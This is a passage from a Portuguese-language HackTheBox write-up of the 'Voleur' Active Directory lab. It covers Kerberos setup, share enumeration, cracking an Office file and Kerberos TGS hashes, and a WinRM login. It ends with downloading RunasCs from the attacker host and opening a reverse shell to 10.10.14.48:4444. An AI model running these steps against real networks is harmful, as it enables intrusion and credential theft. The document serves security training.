</span></span><span class=line><span class=cl>SMB         10.129.102.81   <span class=m>445</span>    10.129.102.81    <span class=o>[</span>-<span class=o>]</span> 10.129.102.81<span class=se>\r</span>yan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
</span></span></code></pre></div><p>Para utilizar o Kerberos pelo Linux, precisaremos configurar o <code>/etc/krb5.conf</code> e o <code>/etc/hosts</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#/etc/krb5.conf</span>
</span></span><span class=line><span class=cl><span class=o>[</span>realms<span class=o>]</span>
</span></span><span class=line><span class=cl>        VOLEUR.HTB <span class=o>=</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>kdc</span> <span class=o>=</span> dc.voleur.htb
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#/etc/hosts</span>
</span></span><span class=line><span class=cl>10.129.102.81   dc.voleur.htb voleur.htb
</span></span></code></pre></div><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="text-primary-400 pe-3 flex items-center"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417 293 53c-16.33-28-57.54-28-73.98.0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6c32.76.0 53.26-35 36.96-63zM232 168c0-13.25 10.75-24 24-24s24 10.8 24 24v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zm24 248c-17.36.0-31.44-14.08-31.44-31.44s14.07-31.44 31.44-31.44 31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span></span><span class=dark:text-neutral-300><strong>Sempre que precisarmos utilizar o Kerberos em uma máquina, NUNCA utilize o endereço IP da máquina, o Kerberos só trabalha utilizando DNS, ou seja, ao invés de usar 10.129.102.81, sempre utilizaremos dc.voleur.htb ou voleur.htb, fica a dica.</strong></span></div><p>Com isso configurado, ao tentarmos solicitar o ticket com <code>getTGT.py</code> do <a href=https://github.com/fortra/impacket target=_blank>Impacket</a>, recebemos o erro de Clock skew:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; getTGT.py voleur.htb/ryan.naylor:<span class=s1>&#39;HollowOct31Nyt&#39;</span>
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Kerberos SessionError: KRB_AP_ERR_SKEW<span class=o>(</span>Clock skew too great<span class=o>)</span>
</span></span></code></pre></div><p>Esse erro sempre acontece quando o horário da sua máquina está diferente do horário do Kerberos. Tem várias maneiras de corrigir isso, no meu caso estarei usando o <a href=https://packages.debian.org/sid/faketime target=_blank>Faketime</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; faketime <span class=s2>&#34;</span><span class=k>$(</span>rdate -n voleur.htb -p <span class=p>|</span> awk <span class=s1>&#39;{print $2, $3, $4}&#39;</span> <span class=p>|</span> date -f - <span class=s2>&#34;+%Y-%m-%d %H:%M:%S&#34;</span><span class=k>)</span><span class=s2>&#34;</span> zsh
</span></span></code></pre></div><p>O faketime irá abrir uma shell nova com o horário sincronizado com o horário do AD, com isso conseguimos se autenticar normalmente. Podemos agora solicitar o ticket com o <code>getTGT.py</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; getTGT.py -dc-ip <span class=s2>&#34;dc.voleur.htb&#34;</span> voleur.htb/ryan.naylor:<span class=s1>&#39;HollowOct31Nyt&#39;</span>
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in ryan.naylor.ccache
</span></span></code></pre></div><p>Irei usar também o <code>kinit</code> para solicitar um TGT completo por via das duvidas:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; kinit ryan.naylor@VOLEUR.HTB
</span></span><span class=line><span class=cl>Password <span class=k>for</span> ryan.naylor@VOLEUR.HTB: 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; klist  
</span></span><span class=line><span class=cl>Ticket cache: FILE:ryan.naylor.ccache
</span></span><span class=line><span class=cl>Default principal: ryan.naylor@VOLEUR.HTB
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Valid starting       Expires              Service principal
</span></span><span class=line><span class=cl>07/09/2025 02:02:44  07/09/2025 12:02:44  krbtgt/VOLEUR.HTB@VOLEUR.HTB
</span></span><span class=line><span class=cl>	renew <span class=k>until</span> 07/10/2025 02:02:40
</span></span></code></pre></div><p>Com o ticket do <strong>RYAN.NAYLOR</strong>, podemos enumerar as shares utilizando o <a href=https://www.netexec.wiki/ target=_blank>Netexec</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; <span class=nv>KRB5CCNAME</span><span class=o>=</span>ryan.naylor.ccache nxc smb dc.voleur.htb -k -u ryan.naylor -p <span class=s1>&#39;HollowOct31Nyt&#39;</span> --shares
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               <span class=o>[</span>*<span class=o>]</span>  x64 <span class=o>(</span>name:dc<span class=o>)</span> <span class=o>(</span>domain:voleur.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span> <span class=o>(</span>NTLM:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               <span class=o>[</span>+<span class=o>]</span> voleur.htb<span class=se>\r</span>yan.naylor:HollowOct31Nyt 
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               <span class=o>[</span>*<span class=o>]</span> Enumerated shares
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               -----           -----------     ------
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               ADMIN$                          Remote Admin
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               C$                              Default share
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               Finance                         
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               HR                              
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               IPC$            READ            Remote IPC
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               IT              READ            
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               NETLOGON        READ            Logon server share 
</span></span><span class=line><span class=cl>SMB         dc.voleur.htb   <span class=m>445</span>    dc               SYSVOL          READ            Logon server share                               
</span></span></code></pre></div><p>Aqui nos deparamos com uma share interessante, a <code>IT</code>. Podemos entrar nela e ver que tipo de arquivo ela compartilha. Para isso podemos usar o <code>smbclient</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; smbclient //dc.voleur.htb/IT --use-kerberos<span class=o>=</span>required --use-krb5-ccache<span class=o>=</span>/workspace/ryan.naylor.ccache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>smb: <span class=se>\F</span>irst-Line Support<span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Wed Jan <span class=m>29</span> 06:40:17 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Wed Jan <span class=m>29</span> 06:10:01 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  Access_Review.xlsx                  A    <span class=m>16896</span>  Thu Jan <span class=m>30</span> 11:14:25 <span class=m>2025</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=m>5311743</span> blocks of size 4096. <span class=m>893859</span> blocks available
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>smb: <span class=se>\F</span>irst-Line Support<span class=se>\&gt;</span> get Access_Review.xlsx
</span></span><span class=line><span class=cl>getting file <span class=se>\F</span>irst-Line Support<span class=se>\A</span>ccess_Review.xlsx of size <span class=m>16896</span> as Access_Review.xlsx <span class=o>(</span>28.1 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 28.1 KiloBytes/sec<span class=o>)</span>
</span></span></code></pre></div><p>Dentro da share IT encontramos um arquivo <code>xlsx</code>, baixando ele e tentando abrir, descobrimos que ele possui senha:</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=xlsx src=https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761865819/24f0809d-95b7-4f2a-985b-e9147892c293.png></figure><p>Podemos tentar um ataque de força bruta nesse arquivo, para isso irei usar o <a href=https://gist.github.com/luca-m/42e9a556a8b621bb181456067785358c target=_blank>office2john</a> e a wordlist rockyou:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; office2john.py Access_Review.xlsx &gt; <span class=nb>hash</span>             
</span></span><span class=line><span class=cl>&gt; john --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt <span class=nb>hash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>Office, 2007/2010/2013 <span class=o>[</span>SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>MS Office version<span class=o>)</span> is <span class=m>2013</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Cost <span class=m>2</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>100000</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, <span class=s1>&#39;h&#39;</span> <span class=k>for</span> help, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>football1        <span class=o>(</span>Access_Review.xlsx<span class=o>)</span>     
</span></span><span class=line><span class=cl>1g 0:00:00:07 DONE <span class=o>(</span>2025-07-09 02:14<span class=o>)</span> 0.1318g/s 103.3p/s 103.3c/s 103.3C/s football1..lolita
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed. 
</span></span></code></pre></div><p>Abrindo o arquivo xlsx, encontramos as seguintes informações:</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=users src=https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761865929/c9ab7224-ebea-4adb-ad78-e0860eb66074.png></figure><p>Aqui temos algumas informações valiosas, que são:</p><ul><li>Existia um usuário chamado <strong>TODD.WOLFE</strong> que foi <strong>DELETADO</strong>, e sua senha é <code>NightT1meP1dg3on14</code>;</li><li>O usuário <strong>LACEY.MILLER</strong> e o <strong>TODD.WOLFE</strong> tem acesso nível <code>Second-Line Support Technician</code>;</li><li><strong>JEREMY.COMBS</strong> tem acesso nível <code>Third-Line Support Technician</code>;</li><li><strong><strong>SVC_LDAP</strong></strong> tem a senha <code>M1XyC9pW7qT5Vn</code>;</li><li><strong>SVC_IIS</strong> tem a senha <code>N5pXyW1VqM7CZ8</code>;</li><li>A senha do <strong>SVC_BACKUP</strong> está com o <strong>JEREMY.COMBS</strong>.</li></ul><h4 class="relative group">Utilizando de um Kerberoasting para obter o SVC_WINRM<div id=utilizando-de-um-kerberoasting-para-obter-o-svc_winrm class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#utilizando-de-um-kerberoasting-para-obter-o-svc_winrm aria-label=Âncora>#</a></span></h4><p>Com essas informações, podemos ir para o bloodhound. Irei utilizar o <a href=https://github.com/dirkjanm/BloodHound.py target=_blank>bloodhound-python</a> para scannear o AD e gerar um zip para digerir no <a href=https://github.com/SpecterOps/BloodHound-Legacy target=_blank>bloodhound-legacy</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>KRB5CCNAME</span><span class=o>=</span>ryan.naylor.ccache bloodhound-python -k -u ryan.naylor -p <span class=s1>&#39;HollowOct31Nyt&#39;</span> -d voleur.htb -ns 10.129.102.81 -c ALL --zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>INFO: BloodHound.py <span class=k>for</span> BloodHound LEGACY <span class=o>(</span>BloodHound 4.2 and 4.3<span class=o>)</span>
</span></span><span class=line><span class=cl>INFO: Found AD domain: voleur.htb
</span></span><span class=line><span class=cl>INFO: Using TGT from cache
</span></span><span class=line><span class=cl>INFO: Found TGT with correct principal in ccache file.
</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc.voleur.htb
</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains
</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains in the forest
</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> computers
</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc.voleur.htb
</span></span><span class=line><span class=cl>INFO: Found <span class=m>12</span> users
</span></span><span class=line><span class=cl>INFO: Found <span class=m>56</span> groups
</span></span><span class=line><span class=cl>INFO: Found <span class=m>2</span> gpos
</span></span><span class=line><span class=cl>INFO: Found <span class=m>5</span> ous
</span></span><span class=line><span class=cl>INFO: Found <span class=m>19</span> containers
</span></span><span class=line><span class=cl>INFO: Found <span class=m>0</span> trusts
</span></span><span class=line><span class=cl>INFO: Starting computer enumeration with <span class=m>10</span> workers
</span></span><span class=line><span class=cl>INFO: Querying computer: DC.voleur.htb
</span></span><span class=line><span class=cl>INFO: Done in 00M 29S
</span></span><span class=line><span class=cl>INFO: Compressing output into 20250709012536_bloodhound.zip
</span></span></code></pre></div><p>Olhando as permissões do <strong>RYAN.NAYLOR</strong>, não encontramos nada útil:</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=ryan src=https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761866135/f3b18746-4fa3-4480-875c-c05d8c0e292b.png></figure><p>Porém como vimos anteriormente, nós temos as senhas do <strong><strong>SVC_LDAP</strong></strong> e do <strong>SVC_IIS</strong>:</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=svc-iis src=https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761866251/4c375420-0754-4071-b426-261465881bdc.png></figure><p>O <strong>SVC_IIS</strong> não tem nada interessante, porém o <strong><strong>SVC_LDAP</strong></strong> tem bem mais coisas interessantes. Temos a permissão <code>WriteSPN</code> sobre o <strong>SVC_WINRM</strong>, <code>GenericWrite</code> sobre a <strong>LACEY.MILLER</strong> e somos parte do grupo <strong><strong>RESTORE_USERS</strong></strong>.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=svc-ldap src=https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761866643/9796d710-6672-448a-9488-e576dfd87b70.png></figure><p>A permissão <code>WriteSPN</code> nos permite realizar um ataque de Kerberoasting. Esse ataque consiste em solicitar tickets de contas de serviço de dentro do AD para tentar quebrar a hash localmente e descobrir a senha do serviço.</p><p>Para abusar dessa permissão, podemos usar o <code>TargetedKerberoast.py</code> usando o ticket do <strong><strong>SVC_LDAP</strong></strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; getTGT.py voleur.htb/**SVC_LDAP**:<span class=s1>&#39;M1XyC9pW7qT5Vn&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; <span class=nv>KRB5CCNAME</span><span class=o>=</span>**SVC_LDAP**.ccache targetedKerberoast.py -v -d <span class=s2>&#34;voleur.htb&#34;</span> --dc-host <span class=s2>&#34;dc.voleur.htb&#34;</span> -o Kerberoastables.txt -k
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting kerberoast attacks
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Fetching usernames from Active Directory with LDAP
</span></span><span class=line><span class=cl><span class=o>[</span>VERBOSE<span class=o>]</span> SPN added successfully <span class=k>for</span> <span class=o>(</span>lacey.miller<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Writing <span class=nb>hash</span> to file <span class=k>for</span> <span class=o>(</span>lacey.miller<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>VERBOSE<span class=o>]</span> SPN removed successfully <span class=k>for</span> <span class=o>(</span>lacey.miller<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>VERBOSE<span class=o>]</span> SPN added successfully <span class=k>for</span> <span class=o>(</span>svc_winrm<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Writing <span class=nb>hash</span> to file <span class=k>for</span> <span class=o>(</span>svc_winrm<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>VERBOSE<span class=o>]</span> SPN removed successfully <span class=k>for</span> <span class=o>(</span>svc_winrm<span class=o>)</span>
</span></span></code></pre></div><p>Com isso conseguimos as hashs do <strong>SVC_WINRM</strong> e da <strong>LACEY.MILLER</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; cat Kerberoastables.txt 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>lacey.miller<span class=nv>$VOLEUR</span>.HTB<span class=nv>$voleur</span>.htb/lacey.miller*<span class=nv>$97</span>bdc5a8f3d51ea4ed1b2cd2263d3a8d<span class=nv>$04</span>f633f7c3154f8f9356b16fffb2a7c874a34aa04c05ea68a00d6839cd399dc62b9e1b6075521237eeec199e149536d43f705937f3bbd0d0652cafed6f016a831daa7d7c02e94a87c197ad2d7162329aa90a1416ef01c2deac25512ec258873c15a0ec16014e33feb0d5209efdfa5196dd548ccea43b6c3bdd780de25719c79517d0b551a3f9dd95d187a61ad05c2b53b3a95b43602204f23913a99b1a4f636a494ed2c9fb3dd2fb84cebd6392c577d6fe21cc7481bfa60fad816c4bc579037a779da3d4fe21a3f5c5f1f15a640bf7b1d5be0e82c50e507d72ad2ca7bb4ead901357cecd0c7b34c93313dcdce044fdcf1c2911b30f7fbd14a6fad0cbd70643f30bdcad316d2658010de0615a43912e7f832d8bf8e6b3b51f5e46811170477c16f932414a9f526ccbab6936ff97668b6fff75cd6116be5474aa456e08d28346646bdcefc25aabf16b832f4ce943e0f71426c8e14b37d74626697fd1fe98defc41155a236476cd4a89621866a5bd113e49c9227a3fe4ce9293c4020d8bee68bf70e5e431446eb2972c76d7a93dab3af2d104493db52440a7ac5a388dc27d1f518085e95da913aa6a56917a823842c41dddce278a39054c08ef5196c811f067cce70d948a4945c1b6f477bcc86687f65c053c17e75f073b89831dd212d2f3c43e82be11cf02f2468fbcf4e55892657c67e757869bbc0fb93d0b58743a65cd545f7a736f2b308d8d88e73045006a98c62d4a00ab68946585eab2f577badf88d5e2ded59d37e1e603cbaec6c0354db4e5a563b5a2b82ea11cbc8202d107130da1f6995af8b4af4b9ea7e78511f0ac177fe7a2cf2f4af8011073a9ea852559bb68eff7559f21d700600b3b2510d3ab661437e3da8c9adb724c92c8b3ceeac8842ea2a7cd54afe68a0993f21227a658ff55fcc77e9e2c424f2cf736e70065479226372b7aea24f6ccf2646ebdb264ec643f5687bf087ccb85b5da00da1954f70ebaa88d2215caa79b5b5fb0c49f0140ccb11b311d43c54260dc1ca7a7e2ad7c497eb93e3b84b143340b940993fa376ca183eb418bad0b792ec98303942da9cf0f09d09969c36323fdfc90dca698a3df146712a5662ec8534366f2577c3e7ad9b1d9550ee37ee5fc5650dcd81950a43fb4b61ede40d5ccb2d3e24c79242b923cf8f02d05a7d0257dff1326cc2566422abc935c83ba7600d21487f56984dfb2718ff330422b0aefed46c440058e366b1f271bfa251e101b19f389f32e10fb2015652f190810b20943b1473122f82d0b8cd34e7a3481f5947090e56016fef414324b20b47c6de3b6182601c2c00c6de053dbba03c5d12c5844e9ab38568c33a0b9c08f539c845ad791fe5f68890319a31fd03a40ce74a3166a8e164b477691a43299338ffdcdecd326003ba76ff4478100b608a8186b65b9049930f032b8cd7145fab3b8788b97ae77f90e9c2fdb48ac8bd2a128daf79e7e
</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>svc_winrm<span class=nv>$VOLEUR</span>.HTB<span class=nv>$voleur</span>.htb/svc_winrm*<span class=nv>$a3322ddc9b0a1a68300b287d0add2ad6$3</span>ff323083e3a932dcf6c719b340dc14cb2a1aacef2cae416ea18a8b43bc8c9142732625afaecf8a1bc5c132358ce814455681afd982d5218b8d03d8184062677c5be828c2b15ff91d64793743737259dfa58e58cd25d0e6b86a9be5304cb485e49f69831d4b9e54dff5b3e26189efe35c0da2f13c687c2dd276171b204243302ba5cb20b33975307d3d79d7bc0a18906662b9c2cbc490521754a9166161705c2c62d867a6cd594a43c6ce040feeff0c67911904c48e103c54bf9d5c5805b222c1408a2e2ba05418625c7903872426708ba71c4cb95497d9e0e764b7b9b4e2a3939c088a890d1339b822d86f49c0f1492b55ca8c159234d301eb7b52f44e1d626fc81a848ddab2fd01eb9e56a692683be543dc871022a4d986478ef7f3b147e0770b5a83d7ae612df5438254a73767b0888c8c6907490149eec97f38f0f2993cd457fb43e1e78658acbb94c581560aedb016f6cb6deb41eb94abca1bae33af45439af1ad4262c8bc48f5fb2b4c1695522e1cace63748379eb3b7b5936877dd9e249f3d61d19c26ce13546b3619ca87a2eb4866e89f8d77906296ac3995181c15e6b15eb44107e08908faabe73d8c111494c27ce339cb07cc570d53196a9b6664fc9dc9b1ff308ce361043949ca1be60cbeb36ecbfb96a602935576bc38d129603f4ffc9bfc85dc5bef81733c90fa60c811e830c090e7b149a728c75447659e4987ea9c7435e393a19224112e4561a6011117fe33a92717fc5f1eb7b3ec324a36c2df46fbfef23a7daef77050f99ec408841ca8baa994d5615dd1f924a9cd333c0ce54d0cb4a55049feef039c783b3bad5ec130785e73da2ccce0537b9150c255d734a2da01e487a2da3837c327f6777f4872e9dceada3462a13ed2140dfbcb0b7047b879df4a0c9303896c495aae7a97f682a85c506cfcc47f402c5ac52c22dede2f620758c122c23c64d851346634b6729d185679e11fe37a0681be6a0c6b64e8d9bec15459ab1e20b7e32ea9275558e2d45027bc31d7ce0508b7df1456962ee1c7229c297e82cc0a5a3400b787e1c928030a6a9adf990f5f300cfa0f7b4cc2a931dd5e853947f0aa5dfe2fe34be989e5c2104b5482cde644c1c42bd5dbf224ebe3fd0a49221b3444e2bdc9df1688d4af2082ee02a4ac00ddd1bc7f645824695fd00f4681f87a524990bc5d4c117ef314b6f1e851f8ccacfd4ea3f614d3bc8f970c4a704ad8e15aede98541caae883139c03d59b183bd2f78ec101e27aff907df6c9257596abad53197fa9be8406f359e5d12e6f277426335a11be66606ed48e837c53511b10a1df64480b67871fb3a16150b6cd663fa408847307a987d3cd481b77df3397f9451c5e58f5fb201647a09638c4999a2a75fcc57dd785fe1923e6a072b5a397edbedc3b4dd99260b88feecd42d3e50aad2a38c78bcc444f51eb9ef55bea9a01bb2863a2d651a8defcea9cac0395
</span></span></code></pre></div><p>Podemos usar o <code>hashcat</code> ou o <code>john</code> para quebrar as hashs, nesse caso irei usar o <code>john</code> mesmo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; john --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt Kerberoastables.txt 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>2</span> password hashes with <span class=m>2</span> different salts <span class=o>(</span>krb5tgs, Kerberos <span class=m>5</span> TGS-REP etype <span class=m>23</span> <span class=o>[</span>MD4 HMAC-MD5 RC4<span class=o>])</span>
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, <span class=s1>&#39;h&#39;</span> <span class=k>for</span> help, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>AFireInsidedeOzarctica980219afi <span class=o>(</span>?<span class=o>)</span>     
</span></span><span class=line><span class=cl>1g 0:00:00:12 DONE <span class=o>(</span>2025-07-09 03:52<span class=o>)</span> 0.07788g/s 1117Kp/s 2010Kc/s 2010KC/s !!123sabi!!123..*7¡Vamos!
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed.
</span></span></code></pre></div><p>Com isso conseguimos a senha do <strong>SVC_WINRM</strong>, podemos solicitar um TGT, logar no powershell remoto e pegar a user flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; kinit svc_winrm@VOLEUR.HTB         
</span></span><span class=line><span class=cl>Password <span class=k>for</span> svc_winrm@VOLEUR.HTB: 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; evil-winrm -i <span class=s2>&#34;dc.voleur.htb&#34;</span> -r VOLEUR.HTB
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Evil-WinRM shell v3.7
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>ocuments&gt; cat ../Desktop/user.txt
</span></span><span class=line><span class=cl>2782644bd5bc78c03846d47ba58b504e
</span></span></code></pre></div><h2 class="relative group">Root Flag<div id=root-flag class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#root-flag aria-label=Âncora>#</a></span></h2><h3 class="relative group">Obtendo a shell do SVC_LDAP<div id=obtendo-a-shell-do-svc_ldap class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#obtendo-a-shell-do-svc_ldap aria-label=Âncora>#</a></span></h3><p>Voltando para o <code>bloodhound</code> e o arquivo <code>xlsx</code> que encontramos na share <code>IT</code>, vemos que o <strong>SVC_LDAP</strong> faz parte do grupo <strong>RESTORE_USERS</strong>, e existe um usuário chamado <strong>TODD.WOLFE</strong> deletado:</p><p>Porém o <strong>SVC_LDAP</strong> não possui a permissão ps_remote (que permitiria logarmos usando o <code>Evil-Winrm</code>), só que nós temos a senha dele, então nesse caso podemos usar o <a href>RunasCs</a> e rodar comandos na shell dele. Então com isso podemos conseguir uma reverse shell do <strong>SVC_LDAP</strong>.</p><p>Para fazermos isso, primeiro vamos enviar o <code>RunasCs</code> para a máquina:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; *Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>ocuments&gt; Invoke-WebRequest -Uri http://10.10.14.48:9090/_RunasCs.exe -Outfile runas.exe
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; *Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>ocuments&gt; ls
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>ocuments
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                 LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                 -------------         ------ ----
</span></span><span class=line><span class=cl>-a----          7/9/2025  12:10 AM          <span class=m>53248</span> runas.exe
</span></span></code></pre></div><p>Para abrir uma reverse shell, usamos o <code>RunasCs</code> da seguinte maneira:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; *Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_winrm<span class=se>\D</span>ocuments&gt; ./runas.exe **SVC_LDAP** <span class=s1>&#39;M1XyC9pW7qT5Vn&#39;</span> powershell -r 10.10.14.48:4444 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Warning: The logon <span class=k>for</span> user <span class=s1>&#39;**SVC_LDAP**&#39;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class=s1>&#39;8&#39;</span> to obtain a more privileged token.
</span></span><span class=line><span class=cl>
